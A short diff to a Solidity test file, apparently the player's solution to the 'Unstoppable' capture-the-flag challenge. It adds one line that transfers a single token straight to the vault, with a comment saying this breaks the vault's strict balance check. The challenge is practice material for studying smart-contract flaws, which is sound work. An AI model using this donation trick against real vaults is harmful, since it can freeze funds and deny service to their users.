@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Send tokens directly to the vault to break the strict balance check
+        token.transfer(address(vault), 1);
     }
 
     /**
